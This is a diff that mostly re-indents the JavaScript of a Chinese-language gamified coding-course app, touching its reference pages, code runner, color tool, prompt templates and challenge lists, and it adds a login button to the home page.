-                security: ['🔍 端口扫描', '🔐 密码检测', '🕵️ 漏洞扫描'],
-                c: ['📟 控制台程序', '🔢 数据结构', '💾 文件处理'],
-                cpp: ['🎮 游戏开发', '📦 容器应用', '🔧 系统工具'],
-                java: ['📱 桌面应用', '🌐 Web后端', '📊 数据处理'],
-                css: ['🎨 响应式布局', '✨ 动画效果', '🖼️ 组件设计'],
-                javascript: ['🌐 网页交互', '📱 单页应用', '🔌 API调用'],
-                ai: ['🤖 聊天机器人', '📊 数据预测', '🖼️ 图像识别']
-            };
-            const courseTags = tags[course] || tags.python;
-            const colors = ['orange', 'pink', 'teal'];
-            return courseTags.map((tag, i) => 
-                `<span class="bg-${colors[i]}-500/30 text-${colors[i]}-300 px-3 py-1 rounded-full text-sm border border-${colors[i]}-500/50">${tag}</span>`
-            ).join('');
-        }
-        
-        // 速查手册页面
-        function renderReference() {
-            const course = gameState.selectedCourse || 'python';
-            const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
-            
-            const references = {
-                c: [
-                    { title: '数据类型', content: 'int, float, double, char, void' },
-                    { title: '格式化输出', content: '%d整数 %f浮点 %c字符 %s字符串' },
-                    { title: '指针操作', content: '&取地址 *解引用 ->成员访问' },
-                    { title: '内存管理', content: 'malloc分配 free释放 sizeof大小' }
-                ],
-                cpp: [
-                    { title: '输入输出', content: 'cout<< 输出  cin>> 输入  endl换行' },
-                    { title: '容器', content: 'vector动态数组 map映射 set集合' },
-                    { title: '类关键字', content: 'class public private protected virtual' },
-                    { title: '智能指针', content: 'unique_ptr shared_ptr weak_ptr' }
-                ],
-                java: [
-                    { title: '基本类型', content: 'int long float double boolean char' },
-                    { title: '集合框架', content: 'ArrayList HashMap HashSet LinkedList' },
-                    { title: 'OOP关键字', content: 'extends implements abstract interface' },
-                    { title: '异常处理', content: 'try catch finally throw throws' }
-                ],
-                css: [
-                    { title: '选择器', content: '.class #id element [attr] :hover' },
-                    { title: 'Flexbox', content: 'display:flex justify-content align-items' },
-                    { title: 'Grid', content: 'display:grid grid-template-columns gap' },
-                    { title: '动画', content: 'transition animation @keyframes transform' }
-                ],
-                javascript: [
-                    { title: '变量声明', content: 'let const var (推荐let/const)' },
-                    { title: 'DOM操作', content: 'getElementById querySelector innerHTML' },
-                    { title: '数组方法', content: 'map filter reduce forEach find' },
-                    { title: '异步编程', content: 'Promise async/await fetch then/catch' }
-                ],
-                ai: [
-                    { title: '学习类型', content: '监督学习 无监督学习 强化学习' },
-                    { title: '神经网络', content: '输入层 隐藏层 输出层 激活函数' },
-                    { title: '常用框架', content: 'TensorFlow PyTorch Keras scikit-learn' },
-                    { title: 'Prompt技巧', content: '角色设定 分步思考 少样本学习 CoT' }
-                ]
-            };
-            
-            const items = references[course] || [];
-            
-            return `
+}
+
+// 获取项目标签
+function getProjectTags(course) {
+    const tags = {
+        python: ['🔢 计算器', '🎮 小游戏', '📊 数据分析'],
+        security: ['🔍 端口扫描', '🔐 密码检测', '🕵️ 漏洞扫描'],
+        c: ['📟 控制台程序', '🔢 数据结构', '💾 文件处理'],
+        cpp: ['🎮 游戏开发', '📦 容器应用', '🔧 系统工具'],
+        java: ['📱 桌面应用', '🌐 Web后端', '📊 数据处理'],
+        css: ['🎨 响应式布局', '✨ 动画效果', '🖼️ 组件设计'],
+        javascript: ['🌐 网页交互', '📱 单页应用', '🔌 API调用'],
+        ai: ['🤖 聊天机器人', '📊 数据预测', '🖼️ 图像识别']
+    };
+    const courseTags = tags[course] || tags.python;
+    const colors = ['orange', 'pink', 'teal'];
+    return courseTags.map((tag, i) =>
+        `<span class="bg-${colors[i]}-500/30 text-${colors[i]}-300 px-3 py-1 rounded-full text-sm border border-${colors[i]}-500/50">${tag}</span>`
+    ).join('');
+}
+
+// 速查手册页面
+function renderReference() {
+    const course = gameState.selectedCourse || 'python';
+    const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
+
+    const references = {
+        c: [
+            { title: '数据类型', content: 'int, float, double, char, void' },
+            { title: '格式化输出', content: '%d整数 %f浮点 %c字符 %s字符串' },
+            { title: '指针操作', content: '&取地址 *解引用 ->成员访问' },
+            { title: '内存管理', content: 'malloc分配 free释放 sizeof大小' }
+        ],
+        cpp: [
+            { title: '输入输出', content: 'cout<< 输出  cin>> 输入  endl换行' },
+            { title: '容器', content: 'vector动态数组 map映射 set集合' },
+            { title: '类关键字', content: 'class public private protected virtual' },
+            { title: '智能指针', content: 'unique_ptr shared_ptr weak_ptr' }
+        ],
+        java: [
+            { title: '基本类型', content: 'int long float double boolean char' },
+            { title: '集合框架', content: 'ArrayList HashMap HashSet LinkedList' },
+            { title: 'OOP关键字', content: 'extends implements abstract interface' },
+            { title: '异常处理', content: 'try catch finally throw throws' }
+        ],
+        css: [
+            { title: '选择器', content: '.class #id element [attr] :hover' },
+            { title: 'Flexbox', content: 'display:flex justify-content align-items' },
+            { title: 'Grid', content: 'display:grid grid-template-columns gap' },
+            { title: '动画', content: 'transition animation @keyframes transform' }
+        ],
+        javascript: [
+            { title: '变量声明', content: 'let const var (推荐let/const)' },
+            { title: 'DOM操作', content: 'getElementById querySelector innerHTML' },
+            { title: '数组方法', content: 'map filter reduce forEach find' },
+            { title: '异步编程', content: 'Promise async/await fetch then/catch' }
+        ],
+        ai: [
+            { title: '学习类型', content: '监督学习 无监督学习 强化学习' },
+            { title: '神经网络', content: '输入层 隐藏层 输出层 激活函数' },
+            { title: '常用框架', content: 'TensorFlow PyTorch Keras scikit-learn' },
+            { title: 'Prompt技巧', content: '角色设定 分步思考 少样本学习 CoT' }
+        ]
+    };
+
+    const items = references[course] || [];
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center gap-4">
                         <button onclick="navigateTo('home')" class="text-white hover:text-purple-400 transition">← 返回</button>
@@ -4369,11 +4373,11 @@ check_sensitive_files(url)`,
                     </div>
                 </div>
             `;
-        }
-        
-        // JavaScript代码运行器
-        function renderJsRunner() {
-            return `
+}
+
+// JavaScript代码运行器
+function renderJsRunner() {
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center gap-4">
                         <button onclick="navigateTo('home')" class="text-white hover:text-purple-400 transition">← 返回</button>
@@ -4413,38 +4417,38 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                     </div>
                 </div>
             `;
-        }
-        
-        // 运行JavaScript代码
-        function runJsCode() {
-            const code = document.getElementById('js-code').value;
-            const output = document.getElementById('js-output');
-            output.textContent = '';
-            
-            // 重写console.log
-            const logs = [];
-            const originalLog = console.log;
-            console.log = (...args) => {
-                logs.push(args.map(a => typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' '));
-            };
-            
-            try {
-                eval(code);
-                output.textContent = logs.join('\n') || '(无输出)';
-                output.classList.remove('text-red-400');
-                output.classList.add('text-green-400');
-            } catch (e) {
-                output.textContent = '❌ 错误: ' + e.message;
-                output.classList.remove('text-green-400');
-                output.classList.add('text-red-400');
-            } finally {
-                console.log = originalLog;
-            }
-        }
-        
-        // CSS颜色工具
-        function renderColorTool() {
-            return `
+}
+
+// 运行JavaScript代码
+function runJsCode() {
+    const code = document.getElementById('js-code').value;
+    const output = document.getElementById('js-output');
+    output.textContent = '';
+
+    // 重写console.log
+    const logs = [];
+    const originalLog = console.log;
+    console.log = (...args) => {
+        logs.push(args.map(a => typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' '));
+    };
+
+    try {
+        eval(code);
+        output.textContent = logs.join('\n') || '(无输出)';
+        output.classList.remove('text-red-400');
+        output.classList.add('text-green-400');
+    } catch (e) {
+        output.textContent = '❌ 错误: ' + e.message;
+        output.classList.remove('text-green-400');
+        output.classList.add('text-red-400');
+    } finally {
+        console.log = originalLog;
+    }
+}
+
+// CSS颜色工具
+function renderColorTool() {
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center gap-4">
                         <button onclick="navigateTo('home')" class="text-white hover:text-purple-400 transition">← 返回</button>
@@ -4480,117 +4484,117 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                             <div class="glass rounded-xl p-6 md:col-span-2">
                                 <h3 class="text-lg font-bold text-white mb-4">📦 常用颜色</h3>
                                 <div class="grid grid-cols-8 gap-2">
-                                    ${['#ef4444','#f97316','#eab308','#22c55e','#14b8a6','#3b82f6','#8b5cf6','#ec4899',
-                                       '#fca5a5','#fdba74','#fde047','#86efac','#5eead4','#93c5fd','#c4b5fd','#f9a8d4'].map(c => 
-                                        `<div class="h-10 rounded cursor-pointer hover:scale-110 transition" style="background:${c}" onclick="document.getElementById('color-picker').value='${c}';updateColorInfo()"></div>`
-                                    ).join('')}
+                                    ${['#ef4444', '#f97316', '#eab308', '#22c55e', '#14b8a6', '#3b82f6', '#8b5cf6', '#ec4899',
+            '#fca5a5', '#fdba74', '#fde047', '#86efac', '#5eead4', '#93c5fd', '#c4b5fd', '#f9a8d4'].map(c =>
+                `<div class="h-10 rounded cursor-pointer hover:scale-110 transition" style="background:${c}" onclick="document.getElementById('color-picker').value='${c}';updateColorInfo()"></div>`
+            ).join('')}
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
             `;
-        }
-        
-        // 颜色工具辅助函数
-        function updateColorInfo() {
-            const hex = document.getElementById('color-picker').value;
-            const r = parseInt(hex.slice(1,3), 16);
-            const g = parseInt(hex.slice(3,5), 16);
-            const b = parseInt(hex.slice(5,7), 16);
-            document.getElementById('color-info').innerHTML = 
-                '<p class="text-gray-300">HEX: <span class="text-purple-400">' + hex + '</span></p>' +
-                '<p class="text-gray-300">RGB: <span class="text-purple-400">rgb(' + r + ', ' + g + ', ' + b + ')</span></p>';
-        }
-        
-        function updateGradient() {
-            const c1 = document.getElementById('grad-color1').value;
-            const c2 = document.getElementById('grad-color2').value;
-            const gradient = 'linear-gradient(135deg, ' + c1 + ', ' + c2 + ')';
-            document.getElementById('gradient-preview').style.background = gradient;
-            document.getElementById('gradient-code').textContent = gradient;
-        }
-        
-        function copyColor() {
-            const hex = document.getElementById('color-picker').value;
-            navigator.clipboard.writeText(hex);
-            showPopup('颜色代码已复制!', 'success');
-        }
-        
-        // AI Prompt模板库
-        const PROMPT_TEMPLATES = [
-            { id: 0, title: '代码解释', icon: '💻', template: '请解释以下代码的功能和工作原理：\n\n```\n[粘贴代码]\n```' },
-            { id: 1, title: '代码优化', icon: '⚡', template: '请优化以下代码，提高性能和可读性：\n\n```\n[粘贴代码]\n```\n\n请说明优化了哪些地方。' },
-            { id: 2, title: 'Bug修复', icon: '🐛', template: '以下代码有bug，请帮我找出问题并修复：\n\n```\n[粘贴代码]\n```\n\n错误信息：[描述错误]' },
-            { id: 3, title: '学习指导', icon: '📚', template: '我是一个编程初学者，请用简单易懂的方式解释[概念名称]，并给出代码示例。' },
-            { id: 4, title: '项目规划', icon: '🚀', template: '我想开发一个[项目描述]，请帮我：\n1. 规划项目结构\n2. 列出需要的技术栈\n3. 分解开发步骤' },
-            { id: 5, title: '代码生成', icon: '✨', template: '请用[编程语言]编写一个[功能描述]的程序。\n\n要求：\n- [要求1]\n- [要求2]\n- 代码要有注释' },
-            { id: 6, title: '面试准备', icon: '💼', template: '请给我出5道[技术领域]的面试题，难度适中，并提供参考答案。' },
-            { id: 7, title: '文档生成', icon: '📝', template: '请为以下代码生成详细的文档注释：\n\n```\n[粘贴代码]\n```' }
-        ];
-        
-        function renderPromptLib() {
-            let cards = '';
-            PROMPT_TEMPLATES.forEach(p => {
-                cards += '<div class="glass rounded-xl p-5 cursor-pointer hover:border-purple-500/50 border border-transparent transition group" onclick="copyPromptById(' + p.id + ')">';
-                cards += '<div class="text-4xl mb-3">' + p.icon + '</div>';
-                cards += '<h3 class="text-lg font-bold text-white mb-2">' + p.title + '</h3>';
-                cards += '<p class="text-gray-400 text-xs line-clamp-3">' + p.template.substring(0, 60) + '...</p>';
-                cards += '<div class="mt-3 text-purple-400 text-sm opacity-0 group-hover:opacity-100 transition">点击复制</div>';
-                cards += '</div>';
-            });
-            
-            return '<div class="min-h-screen">' +
-                '<nav class="glass-dark p-4 flex items-center gap-4">' +
-                    '<button onclick="navigateTo(\'home\')" class="text-white hover:text-purple-400 transition">← 返回</button>' +
-                    '<h1 class="text-xl font-bold text-white">💬 AI Prompt 模板库</h1>' +
-                '</nav>' +
-                '<div class="container mx-auto px-4 py-8">' +
-                    '<p class="text-gray-400 text-center mb-8">点击模板复制到剪贴板，然后粘贴到AI对话中使用</p>' +
-                    '<div class="grid md:grid-cols-2 lg:grid-cols-4 gap-4 max-w-6xl mx-auto">' +
-                        cards +
-                    '</div>' +
-                '</div>' +
-            '</div>';
-        }
-        
-        function copyPromptById(id) {
-            const prompt = PROMPT_TEMPLATES.find(p => p.id === id);
-            if (prompt) {
-                navigator.clipboard.writeText(prompt.template);
-                showPopup('Prompt模板已复制!', 'success');
-            }
-        }
-        
-        // 主页
-        function renderHome() {
-            // 根据所选课程筛选内容
-            const course = gameState.selectedCourse || 'python';
-            const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
-            
-            // 筛选知识卡片
-            const filteredCards = GAME_DATA.knowledgeCards.filter(cat => 
-                cat.courseType === course || (!cat.courseType && course === 'python')
-            );
-            const totalCards = filteredCards.reduce((sum, cat) => sum + cat.cards.length, 0);
-            const viewedCards = gameState.flippedCards.size;
-            
-            // 筛选挑战题
-            const filteredChallenges = GAME_DATA.challenges.filter(c => 
-                c.courseType === course || (!c.courseType && course === 'python')
-            );
-            const totalChallenges = filteredChallenges.length;
-            const completedChallenges = gameState.completedChallenges.size;
-            
-            // 筛选项目
-            const filteredProjects = GAME_DATA.projects.filter(p => 
-                p.courseType === course || (!p.courseType && course === 'python')
-            );
-            
-            const isPython = course === 'python';
-            const isSecurity = course === 'security';
-            
-            return `
+}
+
+// 颜色工具辅助函数
+function updateColorInfo() {
+    const hex = document.getElementById('color-picker').value;
+    const r = parseInt(hex.slice(1, 3), 16);
+    const g = parseInt(hex.slice(3, 5), 16);
+    const b = parseInt(hex.slice(5, 7), 16);
+    document.getElementById('color-info').innerHTML =
+        '<p class="text-gray-300">HEX: <span class="text-purple-400">' + hex + '</span></p>' +
+        '<p class="text-gray-300">RGB: <span class="text-purple-400">rgb(' + r + ', ' + g + ', ' + b + ')</span></p>';
+}
+
+function updateGradient() {
+    const c1 = document.getElementById('grad-color1').value;
+    const c2 = document.getElementById('grad-color2').value;
+    const gradient = 'linear-gradient(135deg, ' + c1 + ', ' + c2 + ')';
+    document.getElementById('gradient-preview').style.background = gradient;
+    document.getElementById('gradient-code').textContent = gradient;
+}
+
+function copyColor() {
+    const hex = document.getElementById('color-picker').value;
+    navigator.clipboard.writeText(hex);
+    showPopup('颜色代码已复制!', 'success');
+}
+
+// AI Prompt模板库
+const PROMPT_TEMPLATES = [
+    { id: 0, title: '代码解释', icon: '💻', template: '请解释以下代码的功能和工作原理：\n\n```\n[粘贴代码]\n```' },
+    { id: 1, title: '代码优化', icon: '⚡', template: '请优化以下代码，提高性能和可读性：\n\n```\n[粘贴代码]\n```\n\n请说明优化了哪些地方。' },
+    { id: 2, title: 'Bug修复', icon: '🐛', template: '以下代码有bug，请帮我找出问题并修复：\n\n```\n[粘贴代码]\n```\n\n错误信息：[描述错误]' },
+    { id: 3, title: '学习指导', icon: '📚', template: '我是一个编程初学者，请用简单易懂的方式解释[概念名称]，并给出代码示例。' },
+    { id: 4, title: '项目规划', icon: '🚀', template: '我想开发一个[项目描述]，请帮我：\n1. 规划项目结构\n2. 列出需要的技术栈\n3. 分解开发步骤' },
+    { id: 5, title: '代码生成', icon: '✨', template: '请用[编程语言]编写一个[功能描述]的程序。\n\n要求：\n- [要求1]\n- [要求2]\n- 代码要有注释' },
+    { id: 6, title: '面试准备', icon: '💼', template: '请给我出5道[技术领域]的面试题，难度适中，并提供参考答案。' },
+    { id: 7, title: '文档生成', icon: '📝', template: '请为以下代码生成详细的文档注释：\n\n```\n[粘贴代码]\n```' }
+];
+
+function renderPromptLib() {
+    let cards = '';
+    PROMPT_TEMPLATES.forEach(p => {
+        cards += '<div class="glass rounded-xl p-5 cursor-pointer hover:border-purple-500/50 border border-transparent transition group" onclick="copyPromptById(' + p.id + ')">';
+        cards += '<div class="text-4xl mb-3">' + p.icon + '</div>';
+        cards += '<h3 class="text-lg font-bold text-white mb-2">' + p.title + '</h3>';
+        cards += '<p class="text-gray-400 text-xs line-clamp-3">' + p.template.substring(0, 60) + '...</p>';
+        cards += '<div class="mt-3 text-purple-400 text-sm opacity-0 group-hover:opacity-100 transition">点击复制</div>';
+        cards += '</div>';
+    });
+
+    return '<div class="min-h-screen">' +
+        '<nav class="glass-dark p-4 flex items-center gap-4">' +
+        '<button onclick="navigateTo(\'home\')" class="text-white hover:text-purple-400 transition">← 返回</button>' +
+        '<h1 class="text-xl font-bold text-white">💬 AI Prompt 模板库</h1>' +
+        '</nav>' +
+        '<div class="container mx-auto px-4 py-8">' +
+        '<p class="text-gray-400 text-center mb-8">点击模板复制到剪贴板，然后粘贴到AI对话中使用</p>' +
+        '<div class="grid md:grid-cols-2 lg:grid-cols-4 gap-4 max-w-6xl mx-auto">' +
+        cards +
+        '</div>' +
+        '</div>' +
+        '</div>';
+}
+
+function copyPromptById(id) {
+    const prompt = PROMPT_TEMPLATES.find(p => p.id === id);
+    if (prompt) {
+        navigator.clipboard.writeText(prompt.template);
+        showPopup('Prompt模板已复制!', 'success');
+    }
+}
+
+// 主页
+function renderHome() {
+    // 根据所选课程筛选内容
+    const course = gameState.selectedCourse || 'python';
+    const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
+
+    // 筛选知识卡片
+    const filteredCards = GAME_DATA.knowledgeCards.filter(cat =>
+        cat.courseType === course || (!cat.courseType && course === 'python')
+    );
+    const totalCards = filteredCards.reduce((sum, cat) => sum + cat.cards.length, 0);
+    const viewedCards = gameState.flippedCards.size;
+
+    // 筛选挑战题
+    const filteredChallenges = GAME_DATA.challenges.filter(c =>
+        c.courseType === course || (!c.courseType && course === 'python')
+    );
+    const totalChallenges = filteredChallenges.length;
+    const completedChallenges = gameState.completedChallenges.size;
+
+    // 筛选项目
+    const filteredProjects = GAME_DATA.projects.filter(p =>
+        p.courseType === course || (!p.courseType && course === 'python')
+    );
+
+    const isPython = course === 'python';
+    const isSecurity = course === 'security';
+
+    return `
                 <div class="min-h-screen">
                     <!-- 顶部导航 -->
                     <nav class="p-4 flex justify-between items-center glass-dark">
@@ -4602,6 +4606,8 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                             </button>
                         </div>
                         <div class="flex items-center gap-4">
+                            <!-- 用户登录按钮 -->
+                            ${typeof renderUserButton === 'function' ? renderUserButton() : ''}
                             <div class="glass px-4 py-2 rounded-full text-white flex items-center gap-2">
                                 <span class="text-yellow-400">⭐</span> 
                                 <span class="font-bold">${gameState.totalXP}</span> XP
@@ -4627,12 +4633,12 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                             </div>
                             <div class="bg-white/20 rounded-full h-3 overflow-hidden">
                                 <div class="bg-gradient-to-r from-green-400 to-emerald-500 h-full transition-all duration-500" 
-                                     style="width: ${Math.min(100, gameState.todayCompleted/gameState.dailyGoal*100)}%"></div>
+                                     style="width: ${Math.min(100, gameState.todayCompleted / gameState.dailyGoal * 100)}%"></div>
                             </div>
-                            ${gameState.todayCompleted >= gameState.dailyGoal ? 
-                                '<p class="text-green-400 text-sm mt-2 text-center">🎉 今日目标已完成！继续保持！</p>' : 
-                                `<p class="text-gray-300 text-sm mt-2 text-center">还差 ${gameState.dailyGoal - gameState.todayCompleted} 题完成今日目标</p>`
-                            }
+                            ${gameState.todayCompleted >= gameState.dailyGoal ?
+            '<p class="text-green-400 text-sm mt-2 text-center">🎉 今日目标已完成！继续保持！</p>' :
+            `<p class="text-gray-300 text-sm mt-2 text-center">还差 ${gameState.dailyGoal - gameState.todayCompleted} 题完成今日目标</p>`
+        }
                         </div>
                         
                         <!-- 进度概览 -->
@@ -4669,9 +4675,9 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                                     <h3 class="text-2xl font-bold text-white mb-2">知识卡片</h3>
                                     <p class="text-gray-300 mb-4">翻卡片学知识，每张卡片都有代码示例</p>
                                     <div class="flex gap-2 flex-wrap">
-                                        ${filteredCards.slice(0, 4).map(cat => 
-                                            `<span class="bg-purple-500/30 text-purple-300 px-3 py-1 rounded-full text-sm border border-purple-500/50">${cat.icon} ${cat.category}</span>`
-                                        ).join('')}
+                                        ${filteredCards.slice(0, 4).map(cat =>
+            `<span class="bg-purple-500/30 text-purple-300 px-3 py-1 rounded-full text-sm border border-purple-500/50">${cat.icon} ${cat.category}</span>`
+        ).join('')}
                                     </div>
                                 </div>
                             </div>
@@ -4715,17 +4721,17 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                     </div>
                 </div>
             `;
-        }
+}
 
-        // 知识卡片分类页
-        function renderCards() {
-            const course = gameState.selectedCourse || 'python';
-            const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
-            const filteredCards = GAME_DATA.knowledgeCards.filter(cat => 
-                cat.courseType === course || (!cat.courseType && course === 'python')
-            );
-            
-            return `
+// 知识卡片分类页
+function renderCards() {
+    const course = gameState.selectedCourse || 'python';
+    const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
+    const filteredCards = GAME_DATA.knowledgeCards.filter(cat =>
+        cat.courseType === course || (!cat.courseType && course === 'python')
+    );
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center gap-4">
                         <button onclick="navigateTo('home')" class="text-white hover:text-purple-400 transition">
@@ -4739,11 +4745,11 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                         
                         <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
                             ${filteredCards.map((cat, index) => {
-                                const realIndex = GAME_DATA.knowledgeCards.indexOf(cat);
-                                const viewedCount = cat.cards.filter((_, i) => 
-                                    gameState.flippedCards.has(`${cat.category}-${i}`)
-                                ).length;
-                                return `
+        const realIndex = GAME_DATA.knowledgeCards.indexOf(cat);
+        const viewedCount = cat.cards.filter((_, i) =>
+            gameState.flippedCards.has(`${cat.category}-${i}`)
+        ).length;
+        return `
                                     <div class="glass-card tilt-card rounded-2xl p-6 cursor-pointer relative overflow-hidden border-2 border-transparent hover:border-purple-500/50"
                                          onclick="selectCategory(${realIndex})">
                                         <div class="tilt-glow"></div>
@@ -4756,26 +4762,26 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                                             </div>
                                             <div class="mt-4 bg-white/10 rounded-full h-2 overflow-hidden">
                                                 <div class="bg-purple-500 h-full transition-all" 
-                                                     style="width: ${(viewedCount/cat.cards.length)*100}%"></div>
+                                                     style="width: ${(viewedCount / cat.cards.length) * 100}%"></div>
                                             </div>
                                         </div>
                                     </div>
                                 `;
-                            }).join('')}
+    }).join('')}
                         </div>
                     </div>
                 </div>
             `;
-        }
+}
 
-        // 卡片详情页
-        function renderCardDetail() {
-            const category = GAME_DATA.knowledgeCards[gameState.selectedCategory];
-            const card = category.cards[gameState.currentCardIndex];
-            const cardId = `${category.category}-${gameState.currentCardIndex}`;
-            const isFlipped = gameState.flippedCards.has(cardId);
-            
-            return `
+// 卡片详情页
+function renderCardDetail() {
+    const category = GAME_DATA.knowledgeCards[gameState.selectedCategory];
+    const card = category.cards[gameState.currentCardIndex];
+    const cardId = `${category.category}-${gameState.currentCardIndex}`;
+    const isFlipped = gameState.flippedCards.has(cardId);
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center justify-between">
                         <div class="flex items-center gap-4">
@@ -4825,87 +4831,87 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                         <!-- 卡片进度 -->
                         <div class="mt-8 flex gap-2">
                             ${category.cards.map((_, i) => {
-                                const cid = `${category.category}-${i}`;
-                                const viewed = gameState.flippedCards.has(cid);
-                                const current = i === gameState.currentCardIndex;
-                                return `<div class="w-3 h-3 rounded-full ${current ? 'bg-purple-500' : viewed ? 'bg-green-500' : 'bg-gray-600'}"></div>`;
-                            }).join('')}
+        const cid = `${category.category}-${i}`;
+        const viewed = gameState.flippedCards.has(cid);
+        const current = i === gameState.currentCardIndex;
+        return `<div class="w-3 h-3 rounded-full ${current ? 'bg-purple-500' : viewed ? 'bg-green-500' : 'bg-gray-600'}"></div>`;
+    }).join('')}
                         </div>
                     </div>
                 </div>
             `;
-        }
+}
 
-        // 获取题目分类
-        function getChallengeCategory(id) {
-            for (const [cat, ids] of Object.entries(CHALLENGE_CATEGORIES)) {
-                if (ids.includes(id)) return cat;
-            }
-            return '其他';
-        }
-        
-        // 筛选题目
-        function getFilteredChallenges() {
-            const course = gameState.selectedCourse || 'python';
-            
-            return GAME_DATA.challenges.filter((challenge, index) => {
-                // 课程筛选 - 支持所有课程
-                const matchesCourse = challenge.courseType === course || 
-                    (!challenge.courseType && course === 'python');
-                if (!matchesCourse) return false;
-                
-                // 难度筛选
-                if (gameState.filterDifficulty > 0 && challenge.difficulty !== gameState.filterDifficulty) {
-                    return false;
-                }
-                // 状态筛选
-                const completed = gameState.completedChallenges.has(challenge.id);
-                if (gameState.filterStatus === 'completed' && !completed) return false;
-                if (gameState.filterStatus === 'incomplete' && completed) return false;
-                // 分类筛选
-                if (gameState.filterCategory !== 'all') {
-                    const cat = getChallengeCategory(challenge.id);
-                    if (cat !== gameState.filterCategory) return false;
-                }
-                return true;
-            });
-        }
-        
-        // 设置筛选
-        function setFilter(type, value) {
-            if (type === 'difficulty') gameState.filterDifficulty = parseInt(value);
-            if (type === 'status') gameState.filterStatus = value;
-            if (type === 'category') gameState.filterCategory = value;
-            // 重置页码到第一页
-            gameState.challengePage = 0;
-            render();
-        }
+// 获取题目分类
+function getChallengeCategory(id) {
+    for (const [cat, ids] of Object.entries(CHALLENGE_CATEGORIES)) {
+        if (ids.includes(id)) return cat;
+    }
+    return '其他';
+}
 
-        // 挑战列表页
-        function renderChallenges() {
-            const course = gameState.selectedCourse || 'python';
-            const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
-            const allFilteredChallenges = getFilteredChallenges();
-            
-            // 分页计算
-            const perPage = gameState.challengesPerPage;
-            const totalPages = Math.ceil(allFilteredChallenges.length / perPage);
-            if (gameState.challengePage >= totalPages) gameState.challengePage = Math.max(0, totalPages - 1);
-            const currentPage = gameState.challengePage;
-            const startIdx = currentPage * perPage;
-            const filteredChallenges = allFilteredChallenges.slice(startIdx, startIdx + perPage);
-            
-            // 计算当前课程的题目
-            const courseChallenges = GAME_DATA.challenges.filter(c => 
-                c.courseType === course || (!c.courseType && course === 'python')
-            );
-            const courseTotal = courseChallenges.length;
-            // 计算该课程已完成的数量
-            const courseCompleted = courseChallenges.filter(c => 
-                gameState.completedChallenges.has(c.id)
-            ).length;
-            
-            return `
+// 筛选题目
+function getFilteredChallenges() {
+    const course = gameState.selectedCourse || 'python';
+
+    return GAME_DATA.challenges.filter((challenge, index) => {
+        // 课程筛选 - 支持所有课程
+        const matchesCourse = challenge.courseType === course ||
+            (!challenge.courseType && course === 'python');
+        if (!matchesCourse) return false;
+
+        // 难度筛选
+        if (gameState.filterDifficulty > 0 && challenge.difficulty !== gameState.filterDifficulty) {
+            return false;
+        }
+        // 状态筛选
+        const completed = gameState.completedChallenges.has(challenge.id);
+        if (gameState.filterStatus === 'completed' && !completed) return false;
+        if (gameState.filterStatus === 'incomplete' && completed) return false;
+        // 分类筛选
+        if (gameState.filterCategory !== 'all') {
+            const cat = getChallengeCategory(challenge.id);
+            if (cat !== gameState.filterCategory) return false;
+        }
+        return true;
+    });
+}
+
+// 设置筛选
+function setFilter(type, value) {
+    if (type === 'difficulty') gameState.filterDifficulty = parseInt(value);
+    if (type === 'status') gameState.filterStatus = value;
+    if (type === 'category') gameState.filterCategory = value;
+    // 重置页码到第一页
+    gameState.challengePage = 0;
+    render();
+}
+
+// 挑战列表页
+function renderChallenges() {
+    const course = gameState.selectedCourse || 'python';
+    const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
+    const allFilteredChallenges = getFilteredChallenges();
+
+    // 分页计算
+    const perPage = gameState.challengesPerPage;
+    const totalPages = Math.ceil(allFilteredChallenges.length / perPage);
+    if (gameState.challengePage >= totalPages) gameState.challengePage = Math.max(0, totalPages - 1);
+    const currentPage = gameState.challengePage;
+    const startIdx = currentPage * perPage;
+    const filteredChallenges = allFilteredChallenges.slice(startIdx, startIdx + perPage);
+
+    // 计算当前课程的题目
+    const courseChallenges = GAME_DATA.challenges.filter(c =>
+        c.courseType === course || (!c.courseType && course === 'python')
+    );
+    const courseTotal = courseChallenges.length;
+    // 计算该课程已完成的数量
+    const courseCompleted = courseChallenges.filter(c =>
+        gameState.completedChallenges.has(c.id)
+    ).length;
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center justify-between">
                         <div class="flex items-center gap-4">
@@ -4991,10 +4997,10 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                         ` : `
                             <div id="challenge-grid" class="page-content grid md:grid-cols-2 lg:grid-cols-3 gap-4">
                                 ${filteredChallenges.map((challenge) => {
-                                    const index = GAME_DATA.challenges.findIndex(c => c.id === challenge.id);
-                                    const completed = gameState.completedChallenges.has(challenge.id);
-                                    const category = getChallengeCategory(challenge.id);
-                                    return `
+        const index = GAME_DATA.challenges.findIndex(c => c.id === challenge.id);
+        const completed = gameState.completedChallenges.has(challenge.id);
+        const category = getChallengeCategory(challenge.id);
+        return `
                                         <div class="glass-card tilt-card rounded-xl p-5 cursor-pointer relative ${completed ? 'border-l-4 border-green-500' : ''}"
                                              onclick="startChallenge(${index})">
                                             <div class="tilt-content">
